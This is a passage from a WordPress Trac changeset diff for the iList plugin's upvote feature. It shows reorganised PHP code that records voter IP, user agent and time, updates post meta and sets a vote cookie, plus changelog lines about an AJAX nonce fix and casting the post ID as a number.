  | 266 |  | $userinfo[] = array('ip'=>$\_SERVER['REMOTE\_ADDR'],'user\_agent'=>$\_SERVER['HTTP\_USER\_AGENT'],'time'=>date('Y-m-d H:i:s')); |
  | 267 |  | if($tflag==1){ |
  | 268 |  | $getnewvalue = $userinfo; |
  |  | 267 | //Collection user info |
  |  | 268 | $userinfo[] = array('ip'=>$\_SERVER['REMOTE\_ADDR'],'user\_agent'=>$\_SERVER['HTTP\_USER\_AGENT'],'time'=>date('Y-m-d H:i:s')); |
  |  | 269 | if($tflag==1){ |
  |  | 270 | $getnewvalue = $userinfo; |
  |  | 271 | }else{ |
  |  | 272 | $getthumbsupusers = unserialize($unserialized['sl\_thumbs\_up\_user']); |
  |  | 273 | $getnewvalue = array\_merge($getthumbsupusers,$userinfo); |
  |  | 274 | } |
  |  | 275 | //User info assign to meta value key. |
  |  | 276 | $new\_array['sl\_thumbs\_up\_user'] = serialize($getnewvalue); |
  |  | 277 |  |
  |  | 278 |  |
  |  | 279 |  |
  |  | 280 |  |
  |  | 281 | $votes = (int)$new\_array['sl\_thumbs\_up']; |
  |  | 282 | $new\_sl\_array[$k] = $new\_array; |
  |  | 283 |  |
  | 269 | 284 | }else{ |
  | 270 |  | $getthumbsupusers = unserialize($unserialized['sl\_thumbs\_up\_user']); |
  | 271 |  | $getnewvalue = array\_merge($getthumbsupusers,$userinfo); |
  | 272 |  | } |
  | 273 |  | //User info assign to meta value key. |
  | 274 |  | $new\_array['sl\_thumbs\_up\_user'] = serialize($getnewvalue); |
  | 275 |  |  |
  | 276 |  |  |
  | 277 |  |  |
  | 278 |  |  |
  | 279 |  | $votes = (int)$new\_array['sl\_thumbs\_up']; |
  | 280 |  | $new\_sl\_array[$k] = $new\_array; |
  | 281 |  |  |
  | 282 |  | }else{ |
  | 283 |  | $new\_sl\_array[$k] = $unserialized; |
  | 284 |  |  |
  | 285 |  | } |
  |  | 285 | $new\_sl\_array[$k] = $unserialized; |
  |  | 286 |  |
  |  | 287 | } |
  |  | 288 | }   //End of Foreach Loop |
  |  | 289 |  |
  |  | 290 |  |
  |  | 291 | //New Updated value in Array |
  |  | 292 | $updated\_value = serialize($new\_sl\_array); |
  |  | 293 | //wp update query |
  |  | 294 | $wpdb->update( |
  |  | 295 | $wpdb->postmeta, |
  |  | 296 | array( |
  |  | 297 | 'meta\_value' => $updated\_value, |
  |  | 298 | ), |
  |  | 299 | array( 'meta\_id' => $meta\_id ) |
  |  | 300 | ); |
  |  | 301 |  |
  |  | 302 | $voted\_li = array("$li\_id"); |
  |  | 303 |  |
  |  | 304 | $total = 0; |
  |  | 305 | $total = count($\_COOKIE['voted\_li']); |
  |  | 306 | $total = $total+1; |
  |  | 307 | //Creating cookie.. |
  |  | 308 | setcookie("voted\_li[$total]",$li\_id, time() + (86400 \* 30), "/"); |
  |  | 309 |  |
  |  | 310 | $data['vote\_status'] = 'success'; |
  |  | 311 | $data['votes'] = $votes; |
  |  | 312 |  |
  | 286 | 313 | }   //End of Foreach Loop |
  | 287 |  |  |
  | 288 |  |  |
  | 289 |  | //New Updated value in Array |
  | 290 |  | $updated\_value = serialize($new\_sl\_array); |
  | 291 |  | //wp update query |
  | 292 |  | $wpdb->update( |
  | 293 |  | $wpdb->postmeta, |
  | 294 |  | array( |
  | 295 |  | 'meta\_value' => $updated\_value, |
  | 296 |  | ), |
  | 297 |  | array( 'meta\_id' => $meta\_id ) |
  | 298 |  | ); |
  | 299 |  |  |
  | 300 |  | $voted\_li = array("$li\_id"); |
  | 301 |  |  |
  | 302 |  | $total = 0; |
  | 303 |  | $total = count($\_COOKIE['voted\_li']); |
  | 304 |  | $total = $total+1; |
  | 305 |  | //Creating cookie.. |
  | 306 |  | setcookie("voted\_li[$total]",$li\_id, time() + (86400 \* 30), "/"); |
  | 307 |  |  |
  | 308 |  | $data['vote\_status'] = 'success'; |
  | 309 |  | $data['votes'] = $votes; |
  | 310 |  |  |
  | 311 |  | }   //End of Foreach Loop |
  |  | 314 |  |
  |  | 315 | }   //End if |
  |  | 316 |  |
  |  | 317 |  |
  | 312 | 318 | }   //End of cookie checking. |
  | 313 | 319 |  |
* ## [infographic-and-list-builder-ilist/trunk/readme.txt](/changeset/2684336/infographic-and-list-builder-ilist/trunk/readme.txt "Show the changeset 2684336 restricted to infographic-and-list-builder-ilist/trunk/readme.txt")

  | [r2684316](/browser/infographic-and-list-builder-ilist/trunk/readme.txt?rev=2684316#L193 "Show revision 2684316 of this file in browser") | [r2684336](/browser/infographic-and-list-builder-ilist/trunk/readme.txt?rev=2684336#L193 "Show revision 2684336 of this file in browser") |  |
  | --- | --- | --- |
  | 193 | 193 | == Changelog == |
  | 194 | 194 |  |
  |  | 195 |  |
  | 195 | 196 | = 4.3.8 = |
  | 196 | 197 | # fixed ajax nonce issue for upvote |
  |  | 198 | # Post ID cast as number |
  | 197 | 199 |  |
  | 198 | 200 | = 4.3.7 = |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2684336)
* [Zip Archive](?format=zip&new=2684336)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


